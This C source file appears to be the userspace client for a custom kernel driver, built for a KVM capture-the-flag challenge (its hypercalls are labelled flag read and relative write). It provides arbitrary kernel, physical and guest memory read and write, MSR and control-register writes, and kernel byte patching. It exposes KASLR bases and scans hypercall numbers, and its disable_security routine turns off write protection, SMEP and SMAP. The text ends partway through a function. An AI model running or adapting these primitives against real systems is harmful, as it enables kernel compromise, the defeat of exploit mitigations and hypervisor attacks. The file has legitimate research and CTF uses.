/*
 * KVM Prober - Userspace Tool
 * Companion tool for kvm_probe_drv.c
 * 
 * Step 1: Symbol Operations (Complete)
 * Step 2: Memory Read Operations (Complete)
 * Step 3: Memory Write Operations (Complete)
 * Step 4: Address Conversion Operations (Complete)
 * Step 5: Hypercall Operations (Complete)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>

#define DEVICE_FILE "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define MAX_READ_SIZE (1024 * 1024)

/* IOCTL Definitions */
#define IOCTL_BASE 0x4000
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)
#define IOCTL_READ_KERNEL_MEM        (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM      (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM         (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION     (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN    (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER       (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR               (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES       (IOCTL_BASE + 0x17)
#define IOCTL_GET_KASLR_INFO         (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PFN_DATA          (IOCTL_BASE + 0x1C)

/* Memory write operations (Step 3) */
#define IOCTL_WRITE_KERNEL_MEM       (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM     (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM        (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR              (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER      (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL          (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL        (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM        (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES            (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN     (IOCTL_BASE + 0x29)

/* Address conversion operations (Step 4) */
#define IOCTL_GPA_TO_HVA             (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA             (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN             (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN             (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA             (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN             (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN             (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA             (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS           (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT           (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN            (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN            (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE            (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN            (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT               (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA          (IOCTL_BASE + 0x3F)

/* Hypercall operations (Step 5) */
#define IOCTL_HYPERCALL              (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH        (IOCTL_BASE + 0x61)

/* Data Structures */
struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char *buffer;
    size_t buffer_size;
    int region_type;
};

struct mem_pattern {
    unsigned char pattern[16];
    size_t pattern_len;
    int match_offset;
};

struct scan_request {
    struct mem_region region;
    struct mem_pattern pattern;
};

struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

struct cr_register_request {
    int cr_num;
    unsigned long value;
};

struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

/* Memory Write Structures (Step 3) */
struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int disable_wp;
};

struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;
};

struct patch_request {
    unsigned long addr;
    unsigned char original[32];
    unsigned char patch[32];
    size_t length;
    int verify_original;
    int addr_type;
};

/* Address Conversion Structures (Step 4) */
struct addr_conv_request {
    unsigned long input_addr;
    unsigned long output_addr;
    int status;
};

struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};

/* Hypercall Structures (Step 5) */
struct hypercall_request {
    unsigned long nr;
    unsigned long a0;
    unsigned long a1;
    unsigned long a2;
    unsigned long a3;
    unsigned long ret;
};

struct hypercall_batch_result {
    unsigned long ret_100;
    unsigned long ret_101;
    unsigned long ret_102;
    unsigned long ret_103;
};

/* Global Variables */
static int fd = -1;

/* Utility Functions */
void hex_dump(const unsigned char *data, size_t size, unsigned long base_addr) {
    for (size_t i = 0; i < size; i += 16) {
        printf("0x%016lx: ", base_addr + i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size) printf("%02x ", data[i + j]);
            else printf("   ");
            if (j == 7) printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = data[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("|\n");
    }
}

int parse_hex_pattern(const char *hex_str, unsigned char *pattern, size_t max_len) {
    size_t len = strlen(hex_str);
    size_t pattern_len = len / 2;
    if (len % 2 != 0 || pattern_len > max_len) return -1;
    for (size_t i = 0; i < pattern_len; i++) {
        if (sscanf(hex_str + 2*i, "%2hhx", &pattern[i]) != 1) return -1;
    }
    return pattern_len;
}

int init_driver(void) {
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open device");
        printf("    Load module: sudo insmod kvm_probe_drv.ko\n");
        return -1;
    }
    printf("[+] Driver initialized\n");
    return 0;
}

/* ========================================================================
 * Hypercall Operations (Step 5)
 * ======================================================================== */

/* Execute a single hypercall */
void do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1, 
                  unsigned long a2, unsigned long a3) {
    struct hypercall_request req = {
        .nr = nr,
        .a0 = a0,
        .a1 = a1,
        .a2 = a2,
        .a3 = a3,
        .ret = 0
    };
    
    if (ioctl(fd, IOCTL_HYPERCALL, &req) < 0) {
        perror("[-] hypercall failed");
        return;
    }
    
    /* Only print details if result is interesting */
    if (req.ret != 0 && req.ret != ~0UL) {
        printf("[+] Hypercall %lu returned: 0x%lx\n", nr, req.ret);
        
        /* Print as hex bytes */
        unsigned char *p = (unsigned char *)&req.ret;
        printf("    Bytes: ");
        for (int i = 0; i < 8; i++) {
            printf("%02x ", p[i]);
        }
        printf("\n");
        
        /* Check if printable ASCII */
        int printable = 1;
        int has_content = 0;
        for (int i = 0; i < 8; i++) {
            if (p[i] == 0) continue;
            has_content = 1;
            if (p[i] < 0x20 || p[i] > 0x7e) {
                printable = 0;
                break;
            }
        }
        if (printable && has_content) {
            printf("    ASCII: %.8s\n", (char *)&req.ret);
        }
    } else {
        printf("[*] Hypercall %lu returned: 0x%lx\n", nr, req.ret);
    }
}

/* Run CTF hypercalls 100-103 and report results */
void hypercall_batch(void) {
    struct hypercall_batch_result result;
    
    if (ioctl(fd, IOCTL_HYPERCALL_BATCH, &result) < 0) {
        perror("[-] hypercall_batch failed");
        return;
    }
    
    printf("[*] CTF Hypercall Batch Results:\n");
    
    /* HC 100 */
    if (result.ret_100 != 0 && result.ret_100 != ~0UL) {
        printf("[+] HC 100: 0x%lx", result.ret_100);
        unsigned char *p = (unsigned char *)&result.ret_100;
        int printable = 1;
        for (int i = 0; i < 8 && p[i]; i++) {
            if (p[i] < 0x20 || p[i] > 0x7e) { printable = 0; break; }
        }
        if (printable && p[0]) printf(" (ASCII: %.8s)", (char *)&result.ret_100);
        printf("\n");
    } else {
        printf("    HC 100: 0x%lx\n", result.ret_100);
    }
    
    /* HC 101 */
    if (result.ret_101 != 0 && result.ret_101 != ~0UL) {
        printf("[+] HC 101: 0x%lx\n", result.ret_101);
    } else {
        printf("    HC 101: 0x%lx\n", result.ret_101);
    }
    
    /* HC 102 */
    if (result.ret_102 != 0 && result.ret_102 != ~0UL) {
        printf("[+] HC 102: 0x%lx\n", result.ret_102);
    } else {
        printf("    HC 102: 0x%lx\n", result.ret_102);
    }
    
    /* HC 103 */
    if (result.ret_103 != 0 && result.ret_103 != ~0UL) {
        printf("[+] HC 103: 0x%lx\n", result.ret_103);
    } else {
        printf("    HC 103: 0x%lx\n", result.ret_103);
    }
}

/* Scan a range of hypercall numbers */
void hypercall_scan(unsigned long start, unsigned long end) {
    printf("[*] Scanning hypercalls %lu to %lu...\n", start, end);
    
    for (unsigned long nr = start; nr <= end; nr++) {
        struct hypercall_request req = {
            .nr = nr,
            .a0 = 0,
            .a1 = 0,
            .a2 = 0,
            .a3 = 0,
            .ret = 0
        };
        
        if (ioctl(fd, IOCTL_HYPERCALL, &req) < 0) {
            continue;
        }
        
        /* Only print interesting results */
        if (req.ret != 0 && req.ret != ~0UL) {
            printf("[+] HC %lu: 0x%lx", nr, req.ret);
            
            /* Check for ASCII */
            unsigned char *p = (unsigned char *)&req.ret;
            int printable = 1;
            for (int i = 0; i < 8 && p[i]; i++) {
                if (p[i] < 0x20 || p[i] > 0x7e) { printable = 0; break; }
            }
            if (printable && p[0]) {
                printf(" (%.8s)", (char *)&req.ret);
            }
            printf("\n");
        }
    }
    printf("[*] Scan complete\n");
}

/* Quick test of CTF hypercalls */
void test_ctf_hypercalls(void) {
    printf("[*] Testing KVM CTF Hypercalls:\n\n");
    
    printf("=== Hypercall 100 (Flag Read) ===\n");
    do_hypercall(100, 0, 0, 0, 0);
    
    printf("\n=== Hypercall 101 (Relative Write - KASAN) ===\n");
    do_hypercall(101, 0, 0, 0, 0);
    
    printf("\n=== Hypercall 102 (Relative Read - KASAN) ===\n");
    do_hypercall(102, 0, 0, 0, 0);
    
    printf("\n=== Hypercall 103 (DoS) - SKIPPED (dangerous) ===\n");
    /* do_hypercall(103, 0, 0, 0, 0); */
    
    printf("\n[*] CTF hypercall test complete\n");
}

/* ========================================================================
 * Symbol Operations
 * ======================================================================== */

void lookup_symbol(const char *name) {
    struct symbol_request req = {0};
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);
    if (ioctl(fd, IOCTL_LOOKUP_SYMBOL, &req) < 0) {
        printf("[-] Symbol '%s' not found\n", name);
        return;
    }
    printf("[+] Symbol: %s @ 0x%lx\n", req.name, req.address);
    if (req.description[0]) printf("    %s\n", req.description);
}

void get_symbol_count(void) {
    unsigned int count;
    if (ioctl(fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) {
        perror("[-] get_symbol_count failed");
        return;
    }
    printf("[+] Found %u KVM symbols\n", count);
}

void list_symbols(int max_count) {
    unsigned int count;
    if (ioctl(fd, IOCTL_GET_SYMBOL_COUNT, &count) < 0) return;
    if (max_count > 0 && (unsigned)max_count < count) count = max_count;
    
    printf("[+] Listing %u symbols:\n", count);
    for (unsigned int i = 0; i < count; i++) {
        struct symbol_request req = {0};
        unsigned int idx = i;
        if (ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &idx) >= 0 &&
            ioctl(fd, IOCTL_GET_SYMBOL_BY_INDEX, &req) >= 0) {
            printf("  [%u] %-40s 0x%lx  %s\n", i, req.name, req.address, req.description);
        }
    }
}

void search_symbols(const char *pattern) {
    struct symbol_request results[16];
    int count = ioctl(fd, IOCTL_SEARCH_SYMBOLS, (void *)pattern);
    if (count <= 0) {
        printf("[-] No symbols match '%s'\n", pattern);
        return;
    }
    if (read(fd, results, sizeof(results)) > 0) {
        printf("[+] Found %d symbols matching '%s':\n", count, pattern);
        for (int i = 0; i < count && i < 16; i++) {
            printf("  [%d] %-40s @ 0x%lx\n", i, results[i].name, results[i].address);
        }
    }
}

void find_symbol_by_name(const char *name) {
    struct symbol_request req = {0};
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);
    if (ioctl(fd, IOCTL_FIND_SYMBOL_BY_NAME, &req) < 0) {
        printf("[-] No symbol contains '%s'\n", name);
        return;
    }
    printf("[+] Found: %s @ 0x%lx - %s\n", req.name, req.address, req.description);
}

void analyze_vmx_handlers(void) {
    int count;
    if (ioctl(fd, IOCTL_GET_VMX_HANDLERS, &count) < 0) return;
    printf("[+] Found %d VMX exit handlers\n", count);
}

void analyze_svm_handlers(void) {
    int count;
    if (ioctl(fd, IOCTL_GET_SVM_HANDLERS, &count) < 0) return;
    printf("[+] Found %d SVM exit handlers\n", count);
}

/* ========================================================================
 * Memory Read Operations
 * ======================================================================== */

void read_kernel_mem(unsigned long addr, size_t size) {
    if (size > MAX_READ_SIZE) { printf("[-] Size too large\n"); return; }
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct kernel_mem_read req = { .kernel_addr = addr, .length = size, .user_buffer = buf };
    printf("[*] Reading kernel memory at 0x%lx (%zu bytes)\n", addr, size);
    
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, addr);
    }
    free(buf);
}

void read_physical_mem(unsigned long phys_addr, size_t size) {
    if (size > MAX_READ_SIZE) { printf("[-] Size too large\n"); return; }
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct physical_mem_read req = { .phys_addr = phys_addr, .length = size, .user_buffer = buf };
    printf("[*] Reading physical memory at 0x%lx (%zu bytes)\n", phys_addr, size);
    
    if (ioctl(fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, phys_addr);
    }
    free(buf);
}

void read_guest_mem(unsigned long gpa, size_t size, int mode) {
    const char *modes[] = {"GPA", "GVA", "GFN"};
    if (size > MAX_READ_SIZE) { printf("[-] Size too large\n"); return; }
    unsigned char *buf = malloc(size);
    if (!buf) { perror("malloc"); return; }
    
    struct guest_mem_read req = { .gpa = gpa, .gva = 0, .length = size, .user_buffer = buf, .mode = mode };
    printf("[*] Reading guest %s 0x%lx (%zu bytes)\n", modes[mode % 3], gpa, size);
    
    if (ioctl(fd, IOCTL_READ_GUEST_MEM, &req) < 0) {
        perror("[-] read failed");
    } else {
        printf("[+] Success:\n");
        hex_dump(buf, size, gpa);
    }
    free(buf);
}

void scan_memory(unsigned long start, unsigned long end, unsigned long step, 
                 int type, const char *pattern_hex) {
    const char *types[] = {"physical", "kernel", "guest"};
    struct scan_request req = {0};
    
    int plen = parse_hex_pattern(pattern_hex, req.pattern.pattern, 16);
    if (plen < 0) { printf("[-] Invalid pattern\n"); return; }
    
    size_t max_results = 256;
    unsigned long *results = malloc(max_results * sizeof(unsigned long));
    if (!results) { perror("malloc"); return; }
    
    req.region.start = start;
    req.region.end = end;
    req.region.step = step;
    req.region.buffer = (unsigned char *)results;
    req.region.buffer_size = max_results * sizeof(unsigned long);
    req.region.region_type = type;
    req.pattern.pattern_len = plen;
    req.pattern.match_offset = -1;
    
    printf("[*] Scanning %s 0x%lx-0x%lx for pattern\n", types[type % 3], start, end);
    
    int found = ioctl(fd, IOCTL_SCAN_MEMORY_REGION, &req);
    if (found > 0) {
        printf("[+] Found %d matches:\n", found);
        for (int i = 0; i < found && i < (int)max_results; i++)
            printf("  [%d] 0x%lx\n", i, results[i]);
    } else {
        printf("[-] No matches\n");
    }
    free(results);
}

void find_pattern(unsigned long start, unsigned long end, const char *pattern_hex) {
    struct pattern_search_request req = {0};
    int plen = parse_hex_pattern(pattern_hex, req.pattern, 16);
    if (plen < 0) { printf("[-] Invalid pattern\n"); return; }
    
    req.start = start;
    req.end = end;
    req.pattern_len = plen;
    
    printf("[*] Searching 0x%lx-0x%lx\n", start, end);
    if (ioctl(fd, IOCTL_FIND_MEMORY_PATTERN, &req) < 0) {
        printf("[-] Pattern not found\n");
    } else {
        printf("[+] Found at 0x%lx\n", req.found_addr);
    }
}

void read_cr_register(int cr_num) {
    struct cr_register_request req = { .cr_num = cr_num, .value = 0 };
    if (ioctl(fd, IOCTL_READ_CR_REGISTER, &req) < 0) {
        perror("[-] read CR failed");
        return;
    }
    printf("[+] CR%d = 0x%lx\n", cr_num, req.value);
    
    if (cr_num == 0) {
        printf("    WP (16): %s\n", (req.value & (1UL<<16)) ? "ENABLED" : "DISABLED");
        printf("    PG (31): %s\n", (req.value & (1UL<<31)) ? "ENABLED" : "DISABLED");
    } else if (cr_num == 3) {
        printf("    PML4 phys: 0x%lx\n", req.value & ~0xFFFUL);
    } else if (cr_num == 4) {
        printf("    SMEP (20): %s\n", (req.value & (1UL<<20)) ? "ENABLED" : "DISABLED");
        printf("    SMAP (21): %s\n", (req.value & (1UL<<21)) ? "ENABLED" : "DISABLED");
    }
}

void read_msr_register(unsigned int msr) {
    struct msr_read_request req = { .msr = msr, .value = 0 };
    if (ioctl(fd, IOCTL_READ_MSR, &req) < 0) {
        perror("[-] read MSR failed");
        return;
    }
    printf("[+] MSR 0x%x = 0x%llx\n", msr, req.value);
}

void dump_page_tables(unsigned long virt_addr) {
    struct page_table_dump dump = { .virtual_addr = virt_addr };
    if (ioctl(fd, IOCTL_DUMP_PAGE_TABLES, &dump) < 0) {
        perror("[-] page table dump failed");
        return;
    }
    printf("[+] Page tables for 0x%lx:\n", virt_addr);
    printf("    PML4E:  0x%lx\n", dump.pml4e);
    printf("    PDPTE:  0x%lx\n", dump.pdpte);
    printf("    PDE:    0x%lx\n", dump.pde);
    printf("    PTE:    0x%lx\n", dump.pte);
    printf("    Physical: 0x%lx\n", dump.physical_addr);
}

void get_kaslr_info(void) {
    struct kaslr_info info = {0};
    if (ioctl(fd, IOCTL_GET_KASLR_INFO, &info) < 0) {
        perror("[-] get KASLR info failed");
        return;
    }
    printf("[+] KASLR Information:\n");
    printf("    Kernel base:  0x%lx\n", info.kernel_base);
    printf("    KASLR slide:  0x%lx\n", info.kaslr_slide);
    printf("    Physmap base: 0x%lx\n", info.physmap_base);
    printf("    Vmalloc base: 0x%lx\n", info.vmalloc_base);
    printf("    Vmemmap base: 0x%lx\n", info.vmemmap_base);
}

void dump_critical_regions(void) {
    printf("[+] Dumping critical memory regions for analysis\n\n");
    
    printf("[1] Control Registers:\n");
    for (int i = 0; i <= 4; i++) {
        if (i != 1) read_cr_register(i);
    }
    
    printf("\n[2] Critical MSRs:\n");
    read_msr_register(0xC0000080);
    read_msr_register(0xC0000082);
    read_msr_register(0xC0000101);
    read_msr_register(0xC0000102);
    
    printf("\n[3] KASLR Info:\n");
    get_kaslr_info();
    
    printf("\n[4] CTF Hypercalls:\n");
    hypercall_batch();
}

/* ========================================================================
 * Memory Write Operations
 * ======================================================================== */

void write_kernel_mem(unsigned long addr, const unsigned char *data, size_t size, int disable_wp) {
    struct kernel_mem_write req = {
        .kernel_addr = addr,
        .length = size,
        .user_buffer = (unsigned char *)data,
        .disable_wp = disable_wp
    };
    
    printf("[*] Writing %zu bytes to kernel 0x%lx (WP bypass: %s)\n", 
           size, addr, disable_wp ? "yes" : "no");
    
    if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        perror("[-] write_kernel_mem failed");
        return;
    }
    printf("[+] Write successful\n");
}

void write_kernel_mem_hex(unsigned long addr, const char *hex_data, int disable_wp) {
    unsigned char data[512];
    int len = parse_hex_pattern(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    write_kernel_mem(addr, data, len, disable_wp);
}

void write_physical_mem(unsigned long phys_addr, const unsigned char *data, size_t size) {
    struct physical_mem_write req = {
        .phys_addr = phys_addr,
        .length = size,
        .user_buffer = (unsigned char *)data
    };
    
    printf("[*] Writing %zu bytes to physical 0x%lx\n", size, phys_addr);
    
    if (ioctl(fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0) {
        perror("[-] write_physical_mem failed");
        return;
    }
    printf("[+] Write successful\n");
}

void write_physical_mem_hex(unsigned long phys_addr, const char *hex_data) {
    unsigned char data[512];
    int len = parse_hex_pattern(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    write_physical_mem(phys_addr, data, len);
}

void write_guest_mem(unsigned long gpa, const unsigned char *data, size_t size, int mode) {
    const char *modes[] = {"GPA", "GVA", "GFN"};
    struct guest_mem_write req = {
        .gpa = gpa,
        .gva = 0,
        .length = size,
        .user_buffer = (unsigned char *)data,
        .mode = mode
    };
    
    printf("[*] Writing %zu bytes to guest %s 0x%lx\n", size, modes[mode % 3], gpa);
    
    if (ioctl(fd, IOCTL_WRITE_GUEST_MEM, &req) < 0) {
        perror("[-] write_guest_mem failed");
        return;
    }
    printf("[+] Write successful\n");
}

void write_guest_mem_hex(unsigned long gpa, const char *hex_data, int mode) {
    unsigned char data[512];
    int len = parse_hex_pattern(hex_data, data, sizeof(data));
    if (len < 0) {
        printf("[-] Invalid hex data\n");
        return;
    }
    write_guest_mem(gpa, data, len, mode);
}

void write_msr(unsigned int msr, unsigned long long value) {
    struct msr_write_request req = { .msr = msr, .value = value };
    printf("[*] Writing MSR 0x%x = 0x%llx\n", msr, value);
    if (ioctl(fd, IOCTL_WRITE_MSR, &req) < 0) {
        perror("[-] write_msr failed");
        return;
    }
    printf("[+] MSR write successful\n");
}

void write_cr(int cr_num, unsigned long value, unsigned long mask) {
    struct cr_write_request req = { .cr_num = cr_num, .value = value, .mask = mask };
    printf("[*] Writing CR%d = 0x%lx (mask: 0x%lx)\n", cr_num, value, mask);
    if (ioctl(fd, IOCTL_WRITE_CR_REGISTER, &req) < 0) {
        perror("[-] write_cr failed");
        return;
    }
    printf("[+] CR write successful\n");
}

void memset_kernel(unsigned long addr, unsigned char value, size_t size) {
    struct memset_request req = { .addr = addr, .value = value, .length = size, .addr_type = 0 };
    printf("[*] Memset kernel 0x%lx with 0x%02x (%zu bytes)\n", addr, value, size);
    if (ioctl(fd, IOCTL_MEMSET_KERNEL, &req) < 0) {
        perror("[-] memset_kernel failed");
        return;
    }
    printf("[+] Memset successful\n");
}

void memset_physical(unsigned long phys_addr, unsigned char value, size_t size) {
    struct memset_request req = { .addr = phys_addr, .value = value, .length = size, .addr_type = 1 };
    printf("[*] Memset physical 0x%lx with 0x%02x (%zu bytes)\n", phys_addr, value, size);
    if (ioctl(fd, IOCTL_MEMSET_PHYSICAL, &req) < 0) {
        perror("[-] memset_physical failed");
        return;
    }
    printf("[+] Memset successful\n");
}

void patch_bytes(unsigned long addr, const char *orig_hex, const char *patch_hex, 
                 int verify, int addr_type) {
    struct patch_request req = {0};
    int orig_len = parse_hex_pattern(orig_hex, req.original, 32);
    int patch_len = parse_hex_pattern(patch_hex, req.patch, 32);
    
    if (orig_len < 0 || patch_len < 0 || orig_len != patch_len) {
        printf("[-] Invalid hex pattern or length mismatch\n");
        return;
    }
    
    req.addr = addr;
    req.length = patch_len;
    req.verify_original = verify;
    req.addr_type = addr_type;
    
    printf("[*] Patching %s 0x%lx (%d bytes)\n",
           addr_type ? "physical" : "kernel", addr, patch_len);
    
    if (ioctl(fd, IOCTL_PATCH_BYTES, &req) < 0) {
        perror("[-] patch_bytes failed");
        return;
    }
    printf("[+] Patch applied successfully\n");
}

void disable_write_protect(void) {
    printf("[!] Disabling Write Protect (CR0.WP)\n");
    write_cr(0, 0, 1UL << 16);
    read_cr_register(0);
}

void disable_smep(void) {
    printf("[!] Disabling SMEP (CR4.SMEP)\n");
    write_cr(4, 0, 1UL << 20);
    read_cr_register(4);
}

void disable_smap(void) {
    printf("[!] Disabling SMAP (CR4.SMAP)\n");
    write_cr(4, 0, 1UL << 21);
    read_cr_register(4);
}

void disable_security(void) {
    printf("[!] Disabling kernel security features...\n\n");
    disable_write_protect();
    printf("\n");
    disable_smep();
    printf("\n");
    disable_smap();
    printf("\n[+] Security features disabled\n");
}

/* ========================================================================
 * Address Conversion Operations
 * ======================================================================== */

void convert_virt_to_phys(unsigned long virt_addr) {
    struct virt_to_phys_request req = { .virt_addr = virt_addr };
    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &req) < 0 || req.status != 0) {
        printf("[-] virt_to_phys failed\n");
        return;
    }
    printf("[+] Virtual: 0x%lx -> Physical: 0x%lx (PFN: 0x%lx)\n",
           req.virt_addr, req.phys_addr, req.pfn);
}

void convert_phys_to_virt(unsigned long phys_addr, int use_ioremap) {
    struct phys_to_virt_request req = { .phys_addr = phys_addr, .use_ioremap = use_ioremap };
    if (ioctl(fd, IOCTL_PHYS_TO_VIRT, &req) < 0 || req.status != 0) {
        printf("[-] phys_to_virt failed\n");
        return;
    }
    printf("[+] Physical: 0x%lx -> Virtual: 0x%lx\n", req.phys_addr, req.virt_addr);
}

void convert_hva_to_pfn(unsigned long hva) {
    struct hva_to_pfn_request req = { .hva = hva };
    if (ioctl(fd, IOCTL_HVA_TO_PFN, &req) < 0 || req.status != 0) {
        printf("[-] hva_to_pfn failed\n");
        return;
    }
    printf("[+] HVA: 0x%lx -> PFN: 0x%lx (PA: 0x%lx)\n", req.hva, req.pfn, req.pfn << 12);
}

void convert_pfn_to_hva(unsigned long pfn) {
    struct addr_conv_request req = { .input_addr = pfn };
    if (ioctl(fd, IOCTL_PFN_TO_HVA, &req) < 0 || req.status != 0) {
        printf("[-] pfn_to_hva failed\n");
        return;
    }
    printf("[+] PFN: 0x%lx -> HVA: 0x%lx\n", pfn, req.output_addr);
}

void convert_gpa_to_gfn(unsigned long gpa) {
    struct addr_conv_request req = { .input_addr = gpa };
    if (ioctl(fd, IOCTL_GPA_TO_GFN, &req) < 0) {
        printf("[-] gpa_to_gfn failed\n");
        return;
    }
    printf("[+] GPA: 0x%lx -> GFN: 0x%lx\n", gpa, req.output_addr);
}

void convert_gfn_to_gpa(unsigned long gfn) {
    struct addr_conv_request req = { .input_addr = gfn };
    if (ioctl(fd, IOCTL_GFN_TO_GPA, &req) < 0) {
        printf("[-] gfn_to_gpa failed\n");
        return;
    }
    printf("[+] GFN: 0x%lx -> GPA: 0x%lx\n", gfn, req.output_addr);
}

void convert_gpa_to_hva(unsigned long gpa) {
    struct gpa_to_hva_request req = { .gpa = gpa };
    if (ioctl(fd, IOCTL_GPA_TO_HVA, &req) < 0 || req.status != 0) {
        printf("[-] gpa_to_hva failed\n");
        return;
    }
    printf("[+] GPA: 0x%lx -> HVA: 0x%lx (GFN: 0x%lx)\n", req.gpa, req.hva, req.gfn);
}

void decode_spte(unsigned long spte) {
    struct spte_to_pfn_request req = { .spte = spte };
